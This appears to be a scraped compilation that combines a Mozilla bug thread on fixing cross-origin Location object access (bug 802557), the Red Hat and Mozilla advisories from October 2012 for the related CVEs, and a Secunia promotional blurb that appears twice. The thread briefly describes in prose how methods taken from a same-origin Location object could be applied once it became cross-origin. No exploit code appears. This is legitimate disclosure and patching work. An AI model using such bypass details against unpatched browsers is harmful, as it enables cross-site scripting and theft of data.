[5:18pm] bholley: oh, I see
[5:19pm] bholley: so, ScriptAccessOnly basically means that the object can only be used in C++ if it's used as the |this| parameter when invoking a method on it with the appropriate Xray wrapper?
[5:20pm] mrbkap: Technically it could be an argument as well, but in reality that's right.
[5:20pm] bholley: hm, how could it be an argument? Where would the relevant unwrapping be done?
[5:20pm] mrbkap: And because of the Xray wrapper creating bound methods bug, you have to call \*that\* function specifically.
[5:20pm] bholley: (which bug is this?)
[5:20pm] mrbkap: That's why I said "technically", right now, that can't happen.

(Since it's probably not obvious to those skimming, this was the key question):
>[5:13pm] bholley: what's to stop you from pulling a method off of the Location object when it's same-origin,
> and then apply()ing it once it's cross-origin?
The 'bound method' situation prevents these functions from being apply-ed to \_other\_ Location objects, but the security characteristics of Location mean that we shouldn't be able to apply() it to the original Location object either. And we can. I'll attach a mochitest that demonstrates the issue without the \_\_proto\_\_ gunk.

apply()ing Location.prototype.toString() won't work, because it will choke on the security wrapper (via isScriptAccessOnly). Only methods pulled off this kind of security wrapper can be used on XOWed objects (and Location objects).

> apply()ing Location.prototype.toString() won't work,
Ah, I see. OK. That will need to get specced too, assuming those methods are on the prototype at all when the spec all shakes out.

So, in the long term, we really need to fix up this whole story. In particular, relying on bound methods and the magic of GetWrappedNativeOfJSObject is pretty lame. I think we need to do a security check at call time somehow. I've been wanting to fix this for a while, but haven't found the cycles to work on it. :-(
In the mean time, I think we need to do a dynamic security check in the actual nsLocation implementation itself. It's a little gross, but should fix this issue, and be good defense-in-depth to boot.
I'll start writing a patch now.

IMO we should actually change this to allow some degree of call/apply with this stuff, because it also affects what can happen with cross-origin objects. Currently, you can't do any sort of call/apply with XOWs, which seems kind of wrong. Maybe we should sit down at some point and figure out exactly how this should look spec-wise?

One may wonder whether the real problem here is the ability to call a method from an object created in your own scope after it changed origin or the fact itself that the security principal of your own object changed. Thus, while a dynamic check in nsLocation is a possible solution, why not consider making each Location specific to their window object? There is no specification of the Location object that mandates making it persistent across pages, let alone origins.

This is possible, but isn't trivial. It would involve "brain transplanting" [1] the Location object along with the window whenever navigation occurs. It would be awesome though, because Location objects are currently the only DOM objects whose security can't be enforced at scope/compartment boundaries. It's actually something I've been wanting to experiment with for a while now.
Regardless though, the fix we do here needs to be safe enough to backport to mozilla-beta, so we'll do the dumb thing for now. If you're interested, I'd be happy to talk in more detail about the other approach.

(also, we'd lose all content-defined properties ("expandos") on page navigation, which might break the web. Do other engines preserve these?)

Compare principals directly in nsLocation.cpp. v1
Why are we checking in the setters? I don't think we should be doing that.
The check in reload() is almost certainly not web-compatible. Same for assign().
On the other hand, we \_do\_ want to check in toString, right?

They implement the same semantics as AccessCheck::IsPermitted. Is there some other way we cam reach these setters and methods?

ToString just calls GetHref, which already has a check.

So right this second, do we prevent reload() and assign() on cross-origin location objects? As well as all setters other than "href"?

OK, then it should document that in the C++ for ToString().

Mochitests. v3

Should the test functions in file\_bug802557.html include gTS.call() and gTS.apply() directly?
Is there a reason gGHR is gotten with lookupGetter and not getOwnPropertyDescriptor? Or perhaps we should test both?
Add some tests using Object.prototype.valueOf?
We should still have a basic test for just reading a location object cross-origin directly, without any games. Or do we have one already?

I also advocate this as the proper solution to this bug. As bholly pointed out, it may not be possible to include this change in a security update, but that's a good design change to consider for future versions.

Because it's not an |own| property, and es5 doesn't provide an Object.getPropertyDescriptor.

I tried, but apparently Object.prototype.valueOf(someObject) === someObject. So it doesn't throw.

Attached patch

[Beta bustage fix. v1](attachment.cgi?id=674241&action=diff)
— [Details](attachment.cgi?id=674241&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=802557&attachment=674241)

Beta went orange because a couple of tests using UniversalXPConnect went orange.
It's not clear to me why this didn't fail on m-c and m-a, but I don't think it
matters. This fix does the trick.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# RHSA-2012:1413 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: thunderbird security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2012%3A1413)

## Topic

An updated thunderbird package that fixes multiple security issues is now
available for Red Hat Enterprise Linux 5 and 6.

The Red Hat Security Response Team has rated this update as having
important security impact. Common Vulnerability Scoring System (CVSS) base
scores, which give detailed severity ratings, are available for each
vulnerability from the CVE links in the References section.

## Description

Mozilla Thunderbird is a standalone mail and newsgroup client.

Multiple flaws were found in the location object implementation in
Thunderbird. Malicious content could be used to perform cross-site
scripting attacks, bypass the same-origin policy, or cause Thunderbird to
execute arbitrary code. (CVE-2012-4194, CVE-2012-4195, CVE-2012-4196)

Red Hat would like to thank the Mozilla project for reporting these issues.
Upstream acknowledges Mariusz Mlynski, moz\_bug\_r\_a4, and Antoine
Delignat-Lavaud as the original reporters of these issues.

Note: None of the issues in this advisory can be exploited by a
specially-crafted HTML mail message as JavaScript is disabled by default
for mail messages. They could be exploited another way in Thunderbird, for
example, when viewing the full remote content of an RSS feed.

All Thunderbird users should upgrade to this updated package, which
contains Thunderbird version 10.0.10 ESR, which corrects these issues.
After installing the update, Thunderbird must be restarted for the changes
to take effect.

## Solution

Before applying this update, make sure all previously-released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at
<https://access.redhat.com/knowledge/articles/11258>

# Mozilla Foundation Security Advisory 2012-90

## Fixes for Location object issues

Announced
October 26, 2012
Reporter
Mariusz Mlynski, moz\_bug\_r\_a4, Antoine Delignat-Lavaud
Impact
Critical
Products
Firefox, Firefox ESR, SeaMonkey, Thunderbird, Thunderbird ESR
Fixed in

* Firefox 16.0.2
* Firefox ESR 10.0.10
* SeaMonkey 2.13.2
* Thunderbird 16.0.2
* Thunderbird ESR 10.0.10

### Description

Mozilla has fixed a number of issues related to the `Location` object in order to enhance overall security. Details for each of the current fixed issues are below.

Thunderbird is only affected by `window.location` issues through RSS feeds and extensions that load web content.

Security researcher **Mariusz Mlynski** reported that the true value of `window.location` could be shadowed by user content through the use of the `valueOf` method, which can be combined with some plugins to perform a cross-site scripting (XSS) attack on users.

### References

* [Location can be spoofed using |valueOf|](https://bugzilla.mozilla.org/show_bug.cgi?id=800666)
* [CVE-2012-4194](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4194)

Mozilla security researcher **moz\_bug\_r\_a4** discovered that the `CheckURL` function in `window.location` can be forced to return the wrong calling document and principal, allowing a cross-site scripting (XSS) attack. There is also the possibility of gaining arbitrary code execution if the attacker can take advantage of an add-on that interacts with the page content.

### References

* [nsLocation::CheckURL can use the wrong principal](https://bugzilla.mozilla.org/show_bug.cgi?id=793121)
* [CVE-2012-4195](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4195)

Security researcher **Antoine Delignat-Lavaud** of the PROSECCO research team at INRIA Paris reported the ability to use property injection by prototype to bypass security wrapper protections on the `Location` object, allowing the cross-origin reading of the `Location` object.

### References

* [More cross origin location access problems](https://bugzilla.mozilla.org/show_bug.cgi?id=802557)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
